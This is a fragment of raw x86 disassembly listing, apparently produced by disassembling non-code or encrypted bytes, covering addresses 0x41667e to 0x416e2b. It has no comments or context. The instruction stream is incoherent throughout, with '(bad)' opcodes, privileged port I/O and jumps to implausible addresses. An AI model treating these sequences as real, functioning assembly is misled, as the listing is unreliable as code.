  41667e:	in     al,dx
  41667f:	stos   DWORD PTR es:[edi],eax
  416680:	imul   edx,DWORD PTR [edx+esi*2-0x5563a7c7],0x6c
  416688:	clc    
  416689:	push   0x60
  41668b:	icebp  
  41668c:	dec    DWORD PTR [edx-0x5fb445d2]
  416692:	jge    0x41670c
  416694:	dec    esp
  416695:	pop    edi
  416696:	ins    DWORD PTR es:[edi],dx
  416697:	lea    ecx,[ecx-0x67]
  41669a:	jecxz  0x4166de
  41669c:	mov    eax,ds:0xab8b1f42
  4166a1:	mov    al,ds:0x3e88baa6
  4166a6:	mov    DWORD PTR [ebp+0x1ad6a2de],ecx
  4166ac:	and    eax,0x246bfa3d
  4166b1:	arpl   di,cx
  4166b3:	jle    0x416672
  4166b5:	rol    DWORD PTR [edi],cl
  4166b7:	rcr    DWORD PTR [eax],0x69
  4166ba:	mov    edx,0xe77a9850
  4166bf:	retf   
  4166c0:	xchg   DWORD PTR [eax],edx
  4166c2:	stc    
  4166c3:	div    BYTE PTR [eax-0x5b8ff899]
  4166c9:	popa   
  4166ca:	scas   eax,DWORD PTR es:[edi]
  4166cb:	xchg   ebx,eax
  4166cc:	scas   al,BYTE PTR es:[edi]
  4166cd:	in     al,0xbc
  4166cf:	test   al,0x8a
  4166d1:	jmp    0xadad2131
  4166d6:	sbb    DWORD PTR [eax-0x30567bb9],edi
  4166dc:	xchg   esp,eax
  4166dd:	mov    edx,0x5b15ebe4
  4166e2:	int3   
  4166e3:	and    eax,ecx
  4166e5:	test   BYTE PTR [edi],ah
  4166e7:	pop    ebp
  4166e8:	out    0xf7,al
  4166ea:	in     al,0xe7
  4166ec:	cwde   
  4166ed:	in     eax,0xde
  4166ef:	xchg   edx,eax
  4166f0:	adc    esp,DWORD PTR [edx+0xceba7c1]
  4166f6:	out    dx,al
  4166f7:	jno    0x41676a
  4166f9:	pusha  
  4166fa:	jns    0x416713
  4166fc:	lods   al,BYTE PTR ds:[esi]
  4166fd:	pushf  
  4166fe:	je     0x416684
  416700:	cmp    ch,BYTE PTR [edi]
  416702:	adc    DWORD PTR [ebp-0x2f090d05],0x5f
  416709:	clc    
  41670a:	lock jg 0x416725
  41670d:	add    al,0xc6
  41670f:	or     DWORD PTR ds:[ebx-0x73],ebp
  416713:	adc    ebp,DWORD PTR [edx]
  416715:	or     ebx,DWORD PTR [edx+0x2a]
  416718:	(bad)  
  416719:	out    0xd3,al
  41671b:	mov    BYTE PTR [edi],al
  41671d:	push   cs
  41671e:	pop    ss
  41671f:	mov    esi,0x78446a44
  416724:	scas   al,BYTE PTR es:[edi]
  416725:	push   edi
  416726:	repz xchg edi,eax
  416728:	mov    ecx,0x4c253e9
  41672d:	daa    
  41672e:	cs xchg ebx,eax
  416730:	inc    ebx
  416731:	lods   eax,DWORD PTR ds:[esi]
  416732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416733:	add    ecx,esp
  416735:	inc    eax
  416736:	gs xchg ecx,eax
  416738:	mov    al,ds:0xa9eaae5b
  41673d:	pop    es
  41673e:	fmul   st,st(5)
  416740:	or     DWORD PTR [edi-0x64],edx
  416743:	(bad)  
  416744:	xor    al,0xb1
  416746:	jecxz  0x4167b4
  416748:	lock gs mov esp,edx
  41674c:	int    0xa1
  41674e:	ror    DWORD PTR [edi],0xd3
  416751:	cmc    
  416752:	jmp    0x4e66:0x37e25e55
  416759:	adc    BYTE PTR [esi+0x63],0xbb
  41675d:	(bad)  
  41675e:	dec    ebp
  41675f:	mov    ebx,0x8754e6c7
  416764:	pusha  
  416765:	xchg   ecx,eax
  416766:	jmp    0xde2316ad
  41676b:	lods   eax,DWORD PTR ds:[esi]
  41676c:	ss mov bh,cl
  41676f:	dec    edi
  416770:	xchg   DWORD PTR [ebx],ebp
  416772:	jo     0x416742
  416774:	xchg   ebx,ebx
  416776:	push   cs
  416777:	hlt    
  416778:	xlat   BYTE PTR ds:[ebx]
  416779:	dec    esp
  41677a:	sub    eax,DWORD PTR [ebx+0x0]
  41677d:	loop   0x416739
  41677f:	std    
  416780:	aas    
  416781:	jmp    0x5f58f0d9
  416786:	xchg   ebx,eax
  416787:	int3   
  416788:	es push edi
  41678a:	push   0xfc466674
  41678f:	scas   eax,DWORD PTR es:[edi]
  416790:	pop    ebx
  416791:	aam    0x40
  416793:	popf   
  416794:	fistp  QWORD PTR [ebx+edi*8]
  416797:	xor    DWORD PTR [ebx-0x33],esi
  41679a:	pop    edx
  41679b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41679c:	jl     0x416809
  41679e:	xor    DWORD PTR [eax],eax
  4167a0:	iret   
  4167a1:	popf   
  4167a2:	sub    al,0xe9
  4167a4:	dec    edi
  4167a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167a6:	mov    edi,0x28511ccf
  4167ab:	cmp    DWORD PTR [ebp+0x38],edi
  4167ae:	sbb    bl,ch
  4167b0:	jge    0x416776
  4167b2:	repnz mov BYTE PTR [esi+edi*2+0x1e621a4f],ch
  4167ba:	push   ds
  4167bb:	jmp    0x3338:0x40d50252
  4167c2:	cmp    BYTE PTR [edi+edx*1-0x3],ah
  4167c6:	pushf  
  4167c7:	sub    dl,BYTE PTR [ebp+0x76ac0ad]
  4167cd:	clc    
  4167ce:	cmp    ebp,eax
  4167d0:	in     eax,dx
  4167d1:	cmp    DWORD PTR ds:0xf6b022a5,0x6b3eb75c
  4167db:	mov    esi,0x53a6d391
  4167e0:	jp     0x41677a
  4167e2:	adc    al,0x1d
  4167e4:	shl    dh,0xa4
  4167e7:	iret   
  4167e8:	xchg   ebp,eax
  4167e9:	inc    ebp
  4167ea:	jns    0x416782
  4167ec:	inc    ebp
  4167ed:	out    dx,eax
  4167ee:	shr    esi,0x43
  4167f1:	jnp    0x41685a
  4167f3:	pop    esi
  4167f4:	clc    
  4167f5:	sbb    DWORD PTR [edx+0x4446c838],edi
  4167fb:	dec    eax
  4167fc:	nop
  4167fd:	call   0x8f10:0x575d8789
  416804:	mov    ds,ebp
  416806:	sub    eax,0x61502392
  41680b:	ins    DWORD PTR es:[edi],dx
  41680c:	dec    esp
  41680d:	lods   eax,DWORD PTR ds:[esi]
  41680e:	dec    esp
  41680f:	addr16 cmp eax,0x76cec926
  416815:	cmp    ch,ch
  416817:	jb     0x416837
  416819:	push   ss
  41681a:	pop    ss
  41681b:	test   BYTE PTR [ecx+edx*2-0xc],cl
  41681f:	push   cs
  416820:	xchg   ebx,eax
  416821:	bound  ecx,QWORD PTR [eax+ebp*4]
  416824:	sbb    eax,0xb53f2327
  416829:	push   esp
  41682a:	pop    edi
  41682b:	stos   BYTE PTR es:[edi],al
  41682c:	add    edx,ebx
  41682e:	add    dl,dl
  416830:	ret    0xbc65
  416833:	fsub   QWORD PTR [ebx]
  416835:	in     al,0x5b
  416837:	(bad)  
  416838:	mov    dl,0xcf
  41683a:	push   eax
  41683b:	aaa    
  41683c:	adc    eax,0xcde29d12
  416841:	jmp    0x41682b
  416843:	adc    DWORD PTR [ebx],esp
  416845:	inc    eax
  416846:	fist   DWORD PTR ds:0xe6d6bb49
  41684c:	push   esp
  41684d:	sahf   
  41684e:	adc    cl,ch
  416850:	jp     0x41688f
  416852:	sbb    DWORD PTR [esi+edi*2-0x34],0x707d3d9c
  41685a:	pop    eax
  41685b:	and    dl,BYTE PTR [edx+0x61]
  41685e:	ror    BYTE PTR [ebx],1
  416860:	clc    
  416861:	es xchg edx,eax
  416863:	cmp    esp,eax
  416865:	loopne 0x416834
  416867:	fld    TBYTE PTR [ebx-0x32db003b]
  41686d:	frstor [ecx-0x45fb4d09]
  416873:	sbb    ecx,DWORD PTR [eax+0x43]
  416876:	sub    BYTE PTR [esi],bl
  416878:	fst    DWORD PTR [edi]
  41687a:	sub    al,0x46
  41687c:	mov    esp,0x477439c0
  416881:	xor    eax,0x55ad8aed
  416886:	dec    edx
  416887:	loop   0x416875
  416889:	inc    edi
  41688a:	sbb    DWORD PTR [eax+0x10],ebx
  41688d:	es dec esi
  41688f:	xor    DWORD PTR [ebx+0x5bf13fbe],ebx
  416895:	fsubr  st(5),st
  416897:	in     eax,0x5f
  416899:	jg     0xa0a7fdcf
  41689f:	mov    esi,0x62669f15
  4168a4:	push   edx
  4168a5:	pop    esp
  4168a6:	enter  0x8550,0xcf
  4168aa:	mov    ah,0x91
  4168ac:	inc    ebx
  4168ad:	shl    esp,cl
  4168af:	int3   
  4168b0:	jnp    0x4168e1
  4168b2:	xchg   esi,eax
  4168b3:	inc    ebx
  4168b4:	and    eax,0x6edbbae2
  4168b9:	cld    
  4168ba:	fild   DWORD PTR [esi+0x46a9ffb8]
  4168c0:	mov    dh,BYTE PTR ds:0x58f97e45
  4168c6:	stos   DWORD PTR es:[edi],eax
  4168c7:	xor    eax,0xf418125b
  4168cc:	pop    ecx
  4168cd:	xchg   edx,eax
  4168ce:	imul   ecx,DWORD PTR [ecx+0x11fba68f],0xffffffe8
  4168d5:	(bad)
  4168d8:	daa    
  4168d9:	pop    edx
  4168da:	ja     0x416913
  4168dc:	push   0x7e6c7202
  4168e1:	js     0x4168c8
  4168e3:	fcom   DWORD PTR [eax+0x1b60e8e3]
  4168e9:	adc    bh,BYTE PTR [edx+0x6dbf209]
  4168ef:	adc    BYTE PTR [eax+eiz*8+0x777e60ca],ch
  4168f6:	sbb    eax,0xeb4d8d5f
  4168fb:	xchg   edx,eax
  4168fc:	pushf  
  4168fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168fe:	repnz inc edx
  416900:	js     0x416892
  416902:	das    
  416903:	xchg   esp,eax
  416904:	aas    
  416905:	xor    BYTE PTR [ebx+0x18ded7b1],cl
  41690b:	cmp    cl,BYTE PTR [eax]
  41690d:	(bad)  
  41690e:	or     eax,0x1eb063e7
  416913:	scas   al,BYTE PTR es:[edi]
  416914:	push   eax
  416915:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  416917:	(bad)  
  416918:	cmp    ch,bh
  41691a:	cmp    DWORD PTR [ebp-0x14fc0853],0x1e2d8faf
  416924:	ror    ecx,1
  416926:	(bad)  
  416927:	dec    esp
  416928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416929:	jae    0x416983
  41692b:	cmp    al,0x29
  41692d:	jne    0x4168f1
  41692f:	test   al,0xfb
  416931:	sbb    DWORD PTR [ebx],edx
  416933:	cmp    al,0x43
  416935:	lods   al,BYTE PTR ds:[esi]
  416936:	in     eax,dx
  416937:	mov    al,0xad
  416939:	retf   
  41693a:	fmul   QWORD PTR [edx]
  41693c:	push   es
  41693d:	or     eax,0x2af014fb
  416942:	rol    BYTE PTR [edx+eiz*2+0x4e],0x59
  416947:	clc    
  416948:	sub    al,BYTE PTR [bp+0x3fb]
  41694d:	xchg   esi,eax
  41694e:	std    
  41694f:	push   esp
  416950:	bound  ebx,QWORD PTR [esi-0x43]
  416953:	mov    ebx,0x298583d4
  416958:	int    0x2
  41695a:	sub    al,0x17
  41695c:	xor    ah,BYTE PTR [esi+0x50553b69]
  416962:	fisttp QWORD PTR [eax+0x7b895b88]
  416968:	xor    bh,BYTE PTR [edx-0x217754e5]
  41696e:	clc    
  41696f:	and    al,0x1
  416971:	sbb    ecx,edi
  416973:	add    cl,BYTE PTR [edx]
  416975:	xchg   ebp,eax
  416976:	jge    0x41697b
  416978:	cmp    ch,BYTE PTR [eax-0x1410647c]
  41697e:	push   edx
  41697f:	push   ss
  416980:	and    eax,0x91b8f819
  416985:	inc    esi
  416986:	mov    al,0x76
  416988:	dec    edi
  416989:	sbb    eax,0xd86c8450
  41698e:	imul   edi,DWORD PTR [ebx-0x76],0xfffffffb
  416992:	(bad)  
  416993:	xchg   edx,eax
  416994:	cli    
  416995:	lods   eax,DWORD PTR ds:[esi]
  416996:	add    eax,0xa61a5452
  41699b:	adc    ebx,DWORD PTR [edx-0x2d]
  41699e:	leave  
  41699f:	mov    edi,0x38a78c61
  4169a4:	hlt    
  4169a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169a6:	iret   
  4169a7:	fdiv   DWORD PTR [eax+edx*2]
  4169aa:	outs   dx,BYTE PTR ds:[esi]
  4169ab:	mov    ds:0x919992e8,al
  4169b0:	fwait
  4169b1:	cmp    eax,0x58fb6dbf
  4169b6:	call   0x5709c4f3
  4169bb:	xor    ah,BYTE PTR [ebx]
  4169bd:	dec    ebx
  4169be:	push   ss
  4169bf:	bound  ecx,QWORD PTR [ebx+0xe09f699]
  4169c5:	and    BYTE PTR [ebp+0x44],ah
  4169c8:	or     esi,esp
  4169ca:	jae    0x41697f
  4169cc:	sbb    al,0x6e
  4169ce:	(bad)  
  4169cf:	mov    cl,0x86
  4169d1:	fsub   QWORD PTR [ebp+0x28f1f872]
  4169d7:	xchg   ebx,eax
  4169d8:	dec    edi
  4169d9:	iret   
  4169da:	push   ebx
  4169db:	fisttp QWORD PTR [edx]
  4169de:	pusha  
  4169df:	imul   DWORD PTR [bx-0x626c]
  4169e4:	std    
  4169e5:	or     BYTE PTR [ecx+0xb61484e],ch
  4169eb:	add    dh,BYTE PTR [eax+0x21]
  4169ee:	mov    esi,0xf3fd076f
  4169f3:	mov    ebp,0xfe451d2c
  4169f8:	pop    esp
  4169f9:	and    eax,0x868616c
  4169fe:	fcmovnu st,st(5)
  416a00:	fisub  WORD PTR [edi+esi*2+0x5b]
  416a04:	shl    BYTE PTR [edx+0x48],cl
  416a07:	cmp    eax,0xafe23ec1
  416a0c:	gs jg  0x4169d5
  416a0f:	adc    al,BYTE PTR [ebp+0x12d20cfa]
  416a15:	retf   
  416a16:	jmp    0x5bd82345
  416a1b:	add    BYTE PTR [ebp-0x33],al
  416a1e:	sti    
  416a1f:	adc    BYTE PTR [edx],dl
  416a21:	inc    ebx
  416a22:	pop    esp
  416a23:	ss push ebx
  416a25:	sub    esp,DWORD PTR [ebp+0x6f2e3031]
  416a2b:	loope  0x4169f7
  416a2d:	leave  
  416a2e:	arpl   WORD PTR [edi+0x1759610d],bx
  416a34:	inc    edx
  416a35:	push   edx
  416a36:	mov    ch,BYTE PTR [esi]
  416a38:	mov    esi,0xd202c428
  416a3d:	inc    edi
  416a3e:	mov    WORD PTR [ebx-0x30ca172],cs
  416a44:	dec    ecx
  416a45:	fwait
  416a46:	ss pop ds
  416a48:	pusha  
  416a49:	pushf  
  416a4a:	les    edi,FWORD PTR [eax+ebp*1+0x1edb8639]
  416a51:	ror    BYTE PTR [edx-0x10],0x18
  416a55:	xor    esp,DWORD PTR [eax-0x792e01cb]
  416a5b:	add    BYTE PTR [esi+0x4c],dh
  416a5e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  416a60:	mov    edi,0x3aaad751
  416a65:	sbb    ch,BYTE PTR [ebx]
  416a67:	ret    
  416a68:	pop    eax
  416a69:	call   0xe31b0fec
  416a6e:	lock mov dh,dh
  416a71:	test   DWORD PTR [edx],edx
  416a73:	or     eax,0x8c508d5
  416a78:	lahf   
  416a79:	pop    edx
  416a7a:	mov    ecx,0x96d93161
  416a7f:	(bad)  
  416a81:	in     al,dx
  416a82:	mov    esi,0xe4c662ef
  416a87:	mov    bl,0x8e
  416a89:	lahf   
  416a8a:	xchg   edx,eax
  416a8b:	dec    ebp
  416a8c:	cmp    al,cl
  416a8e:	imul   ecx,ebp,0x65383e53
  416a94:	and    DWORD PTR [edi+0x48],ebp
  416a97:	sub    al,0x3f
  416a99:	int    0x99
  416a9b:	or     cl,BYTE PTR [ecx+eax*1-0x4b9fef38]
  416aa2:	das    
  416aa3:	jmp    0x6abf:0xc7fc6ca2
  416aaa:	arpl   WORD PTR [eax+0x6],dx
  416aad:	mov    al,0xc8
  416aaf:	es ja  0x416a41
  416ab2:	mov    BYTE PTR [esi-0x1e5c6306],cl
  416ab8:	daa    
  416ab9:	test   esp,esp
  416abb:	rcl    DWORD PTR [eax-0x6746fce4],0x97
  416ac2:	adc    dl,ch
  416ac4:	inc    ebp
  416ac5:	push   eax
  416ac6:	xor    BYTE PTR [ebx],0x5c
  416ac9:	stc    
  416aca:	sbb    eax,0x892ae904
  416acf:	jmp    DWORD PTR [edi-0x1b]
  416ad2:	aad    0x17
  416ad4:	and    eax,0xb3e22aff
  416ad9:	mov    ah,0x83
  416adb:	das    
  416adc:	and    bl,BYTE PTR [esi-0x4e]
  416adf:	jo     0x416b3d
  416ae1:	or     BYTE PTR [eax+0x53],ch
  416ae4:	sti    
  416ae5:	lods   eax,DWORD PTR ds:[esi]
  416ae6:	loope  0x416ab4
  416ae8:	inc    edx
  416ae9:	in     eax,dx
  416aea:	add    DWORD PTR [ebp+ebx*2+0x22a109fc],ebx
  416af1:	mov    ah,0x6
  416af3:	stos   BYTE PTR es:[edi],al
  416af4:	or     al,0x17
  416af6:	dec    edx
  416af7:	jae    0x416aab
  416af9:	cmp    ecx,DWORD PTR [ecx]
  416afb:	cdq    
  416afc:	fldpi  
  416afe:	lods   eax,DWORD PTR ds:[esi]
  416aff:	xchg   esp,eax
  416b00:	xchg   ebp,eax
  416b01:	out    0xb8,eax
  416b03:	(bad)  
  416b04:	fisttp WORD PTR [ebx]
  416b06:	pop    esp
  416b07:	out    dx,al
  416b08:	inc    ebp
  416b09:	xchg   edi,eax
  416b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b0b:	push   0x28
  416b0d:	mov    ch,0x1a
  416b0f:	in     eax,dx
  416b10:	mov    esp,0xfe1777ab
  416b15:	ins    BYTE PTR es:[edi],dx
  416b16:	push   esp
  416b17:	and    cl,cl
  416b19:	in     eax,dx
  416b1a:	mov    edx,?
  416b1c:	in     eax,0x95
  416b1e:	and    edx,edx
  416b20:	retf   
  416b21:	push   ss
  416b22:	rol    DWORD PTR gs:[edx-0xb],cl
  416b26:	test   eax,0xc3a5d3ac
  416b2b:	pop    eax
  416b2c:	adc    edi,DWORD PTR [ebx+0x460d26fb]
  416b32:	ffreep st(0)
  416b34:	push   es
  416b35:	add    al,0x44
  416b37:	(bad)  
  416b38:	imul   ebp,DWORD PTR [edi+0x6a],0x5e
  416b3c:	fst    QWORD PTR [edi]
  416b3e:	popa   
  416b3f:	mov    bh,0x5f
  416b41:	cmp    al,0x4
  416b43:	dec    ebp
  416b44:	pop    ebp
  416b45:	mov    ebp,0x83936ee2
  416b4a:	mov    ebx,0x80c44dc9
  416b4f:	sbb    DWORD PTR [eax+ecx*8+0x2cb1b0f0],esi
  416b56:	mov    edi,0x761e28c0
  416b5b:	xor    al,0xfd
  416b5d:	ja     0x416bb8
  416b5f:	shr    dl,cl
  416b61:	sub    esp,esp
  416b63:	jg     0x416ba4
  416b65:	cmp    DWORD PTR [ebp+0x59541f3d],eax
  416b6b:	fwait
  416b6c:	test   BYTE PTR [ebx],0x23
  416b6f:	push   ecx
  416b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b71:	jb     0x416b98
  416b73:	jmp    0xc3870c9
  416b78:	mov    cl,0x29
  416b7a:	jl     0x416b85
  416b7c:	int    0x58
  416b7e:	std    
  416b7f:	dec    edi
  416b80:	sub    al,0x2b
  416b82:	mov    esp,0x88ccb1d3
  416b87:	mov    edx,0xdce5cf58
  416b8c:	mov    ds:0xc2130fe4,eax
  416b91:	loopne 0x416bb3
  416b93:	xchg   BYTE PTR [ebx*2-0x577bb88d],ah
  416b9a:	shr    BYTE PTR [edi-0x4e],cl
  416b9d:	xor    esi,DWORD PTR [esi+edx*1]
  416ba0:	dec    eax
  416ba1:	dec    ebx
  416ba2:	sub    BYTE PTR [eax+0x24a5d2ea],cl
  416ba8:	outs   dx,BYTE PTR ds:[esi]
  416ba9:	cli    
  416baa:	cs js  0x416ba0
  416bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bae:	pop    eax
  416baf:	scas   al,BYTE PTR es:[edi]
  416bb0:	into   
  416bb1:	jmp    0x416bd0
  416bb3:	jge    0x416be8
  416bb5:	ret    
  416bb6:	iret   
  416bb7:	mov    al,0xee
  416bb9:	(bad)
  416bbd:	xor    ecx,DWORD PTR [edx]
  416bbf:	in     al,dx
  416bc0:	mov    bh,0xe3
  416bc2:	fs lock ss xchg esp,eax
  416bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bc7:	in     al,0x88
  416bc9:	inc    edx
  416bca:	imul   edx,DWORD PTR [ecx+0x1a013e49],0xffffff90
  416bd1:	pop    ebp
  416bd2:	cmp    cl,bh
  416bd4:	xlat   BYTE PTR ds:[ebx]
  416bd5:	pop    es
  416bd6:	std    
  416bd7:	shl    edx,cl
  416bd9:	loop   0x416beb
  416bdb:	icebp  
  416bdc:	call   0x5f01:0xe813bf7a
  416be3:	rcr    DWORD PTR [edi+ebx*2+0x2b],0xa6
  416be8:	cmp    eax,0x7652e6aa
  416bed:	xchg   ebx,eax
  416bee:	xchg   BYTE PTR [ecx+eiz*8+0xe],dl
  416bf2:	jne    0x416ba4
  416bf4:	and    edx,ecx
  416bf6:	push   es
  416bf7:	sbb    eax,0xace9ce95
  416bfc:	and    dh,BYTE PTR [ebx-0x58]
  416bff:	mov    bh,bh
  416c01:	bound  ebp,QWORD PTR [ecx+0x211db30]
  416c07:	adc    BYTE PTR [edi],ah
  416c09:	or     DWORD PTR [eax+0x11],esi
  416c0c:	(bad)  
  416c0d:	in     al,dx
  416c0e:	jge    0x416c53
  416c10:	add    dl,BYTE PTR [edi+0x5b]
  416c13:	hlt    
  416c14:	pop    ecx
  416c15:	(bad)  
  416c16:	out    dx,eax
  416c17:	(bad)  
  416c18:	xor    bh,0x8f
  416c1b:	test   DWORD PTR [ebx-0x33],ebx
  416c1e:	xchg   ecx,eax
  416c1f:	xor    esi,edx
  416c21:	cwde   
  416c22:	fisub  DWORD PTR [edx+0x33]
  416c25:	sbb    eax,0xde302131
  416c2a:	ins    DWORD PTR es:[edi],dx
  416c2b:	push   ss
  416c2c:	or     al,0xae
  416c2e:	hlt    
  416c2f:	test   BYTE PTR [eax+0x9],dl
  416c32:	mov    al,0xfd
  416c34:	das    
  416c35:	shl    DWORD PTR cs:[ebx+eax*1+0x4e],0x3c
  416c3b:	in     al,0x21
  416c3d:	xor    BYTE PTR [eax],ch
  416c3f:	dec    ebp
  416c40:	and    DWORD PTR [esi-0x4b],ebx
  416c43:	sub    al,0xe
  416c45:	in     al,0xc8
  416c47:	(bad)  
  416c48:	in     eax,0xc3
  416c4a:	cmp    al,0xce
  416c4c:	cmp    eax,0x5e243a43
  416c51:	push   0x940dbea
  416c56:	pushf  
  416c57:	iret   
  416c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c59:	test   BYTE PTR [esi+0x41],ch
  416c5c:	push   ds
  416c5d:	not    DWORD PTR [esi-0x29]
  416c60:	and    ah,0x6e
  416c63:	mov    ecx,0x523d1409
  416c68:	(bad)  
  416c69:	repz or al,0x7c
  416c6c:	jecxz  0x416c45
  416c6e:	repz or al,0xf0
  416c71:	sbb    edx,DWORD PTR ds:0x1d4bfdff
  416c77:	push   ss
  416c78:	aad    0xe
  416c7a:	imul   ebp,DWORD PTR [ecx-0x10e164d],0x9256d112
  416c84:	call   FWORD PTR [edi]
  416c86:	test   al,0x8d
  416c88:	aam    0x9e
  416c8a:	sets   BYTE PTR [esi]
  416c8d:	add    ch,0xf0
  416c90:	ret    0xeeb7
  416c93:	shl    BYTE PTR [ecx],1
  416c95:	xor    ebx,DWORD PTR [esi-0x6f]
  416c98:	and    edi,DWORD PTR [edi]
  416c9a:	mov    bl,0xe7
  416c9c:	fadd   st(6),st
  416c9e:	loopne 0x416c74
  416ca0:	inc    edi
  416ca1:	cmc    
  416ca2:	fbld   TBYTE PTR [ebx+ebp*1-0x16]
  416ca6:	sbb    DWORD PTR [eax-0x1baa149b],esi
  416cac:	xchg   ecx,eax
  416cad:	nop
  416cae:	mov    edx,0x6ead2490
  416cb3:	and    eax,0xd7ba104a
  416cb8:	mov    eax,0x6724f383
  416cbd:	mov    bh,0x35
  416cbf:	pushf  
  416cc0:	fmul   QWORD PTR [eax-0x7213677e]
  416cc6:	xor    DWORD PTR ss:[edx+0x2ae6e9f],edi
  416ccd:	push   edx
  416cce:	xchg   esi,eax
  416ccf:	(bad)  
  416cd0:	xor    DWORD PTR [edi],edi
  416cd2:	jno    0x416cca
  416cd4:	mov    ds:0xfa9ff5d2,eax
  416cd9:	arpl   WORD PTR ds:0xeea93bdf,cx
  416cdf:	sub    ebx,0x1a6037e8
  416ce5:	rol    DWORD PTR [edx+0x36],0x56
  416ce9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cea:	dec    esi
  416ceb:	fcom   DWORD PTR [edx]
  416ced:	push   eax
  416cee:	xchg   esp,eax
  416cef:	mov    esp,DWORD PTR [eax+0x7812750b]
  416cf5:	outs   dx,BYTE PTR ds:[esi]
  416cf6:	xor    edx,eax
  416cf8:	repz jno 0x416ceb
  416cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cfc:	fcmovne st,st(0)
  416cfe:	adc    dh,BYTE PTR [ebx+0xc6a927f]
  416d04:	pop    ss
  416d05:	push   cs
  416d06:	sub    esp,edx
  416d08:	sti    
  416d09:	stos   DWORD PTR es:[edi],eax
  416d0a:	clc    
  416d0b:	leave  
  416d0c:	stos   DWORD PTR es:[edi],eax
  416d0d:	jb     0x416d45
  416d0f:	aad    0x14
  416d11:	in     eax,dx
  416d12:	ds out dx,eax
  416d14:	outs   dx,BYTE PTR ds:[esi]
  416d15:	repz push esi
  416d17:	xchg   ebp,eax
  416d18:	cwde   
  416d19:	pop    ebx
  416d1a:	jp     0x416d90
  416d1c:	loope  0x416cfa
  416d1e:	sub    ecx,DWORD PTR [ebx+0x22f82b4f]
  416d24:	jecxz  0x416d52
  416d26:	push   ebp
  416d27:	xchg   ecx,eax
  416d28:	bound  ecx,QWORD PTR [ebp+ebx*1-0x63]
  416d2c:	arpl   sp,bp
  416d2e:	add    dh,dh
  416d30:	sub    BYTE PTR [ebx+0x52],bh
  416d33:	jbe    0x416d60
  416d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d36:	push   ds
  416d37:	xchg   DWORD PTR [edx+0x75ed4272],ebx
  416d3d:	fwait
  416d3e:	jns    0x416ced
  416d40:	shl    ch,0xc3
  416d43:	jle    0x416d2e
  416d45:	not    BYTE PTR [edi-0x36]
  416d48:	jg     0x416d8e
  416d4a:	shl    BYTE PTR [eax],1
  416d4c:	cmp    cl,cl
  416d4e:	cmp    eax,0x7a3e6004
  416d53:	(bad)  [ecx]
  416d55:	sub    DWORD PTR [ecx+edx*1+0x34ee2b90],0xcbca3c60
  416d60:	lods   eax,DWORD PTR ds:[esi]
  416d61:	cwde   
  416d62:	xchg   esi,eax
  416d63:	pop    ebp
  416d64:	inc    ecx
  416d65:	push   ecx
  416d66:	jnp    0x416d7d
  416d68:	cs cli 
  416d6a:	repnz int3 
  416d6c:	pop    ebx
  416d6d:	sbb    eax,0xee343ea
  416d72:	sbb    edi,DWORD PTR [ebx-0x39]
  416d75:	shr    BYTE PTR [ecx+0x4c991825],cl
  416d7b:	clc    
  416d7c:	xchg   edi,eax
  416d7d:	push   es
  416d7e:	dec    esi
  416d7f:	xor    al,0xae
  416d81:	mov    cl,0x95
  416d83:	sub    ch,cl
  416d85:	mov    BYTE PTR [esi],al
  416d87:	gs enter 0x8246,0xc6
  416d8c:	dec    edi
  416d8d:	mov    eax,ds:0xd836ab06
  416d92:	test   eax,0xa12d4c30
  416d97:	fstp   DWORD PTR [edi+0x10]
  416d9a:	cld    
  416d9b:	xor    ebp,ecx
  416d9d:	adc    edi,ecx
  416d9f:	sub    DWORD PTR [edi-0x39],esp
  416da2:	sbb    cl,ch
  416da4:	dec    ecx
  416da5:	dec    ebx
  416da6:	push   eax
  416da7:	iret   
  416da8:	jno    0x416de0
  416daa:	idiv   BYTE PTR [ebp+ecx*4+0x18]
  416dae:	jle    0x416d3d
  416db0:	stc    
  416db1:	dec    ecx
  416db2:	inc    esi
  416db3:	scas   al,BYTE PTR es:[edi]
  416db4:	jo     0x416dd9
  416db6:	push   es
  416db7:	mov    esp,0xc10fcdd8
  416dbc:	jae    0x416e06
  416dbe:	cmp    esp,esp
  416dc0:	jns    0x416d89
  416dc2:	adc    dl,BYTE PTR [esi]
  416dc4:	cmp    eax,0x78f1714b
  416dc9:	es out 0xaf,al
  416dcc:	inc    eax
  416dcd:	ins    BYTE PTR es:[edi],dx
  416dce:	frstor [edi+0x23821955]
  416dd4:	pop    edi
  416dd5:	jo     0x416d75
  416dd7:	ror    DWORD PTR [ebx],1
  416dd9:	test   al,0x58
  416ddb:	adc    bl,BYTE PTR [esi-0x6ff2768b]
  416de1:	jnp    0x416db5
  416de3:	mov    eax,DWORD PTR [ecx]
  416de5:	jmp    0x761e:0xe0b1df67
  416dec:	int    0x7a
  416dee:	mov    ebx,0x5078ff87
  416df3:	sub    dh,bl
  416df5:	(bad)  
  416df7:	push   ebx
  416df8:	mov    ebx,0xc0d0ce6d
  416dfd:	sub    eax,0x1585ab3b
  416e02:	inc    ebp
  416e03:	repnz sub bl,cl
  416e06:	push   0x5aaa6d4c
  416e0b:	les    edi,FWORD PTR [eax+edx*4]
  416e0e:	(bad)  
  416e0f:	adc    al,0xfa
  416e11:	sbb    BYTE PTR [ebx-0x1b354b0b],ah
  416e17:	inc    edx
  416e18:	mov    ah,0x42
  416e1a:	mov    ebx,DWORD PTR [ecx+0x1a]
  416e1d:	xor    bh,BYTE PTR [edx-0x194e7316]
  416e23:	xor    DWORD PTR [edx-0x1d2077ce],ebx
  416e29:	lods   al,BYTE PTR ds:[esi]
  416e2a:	(bad)  
  416e2b:	out    dx,al
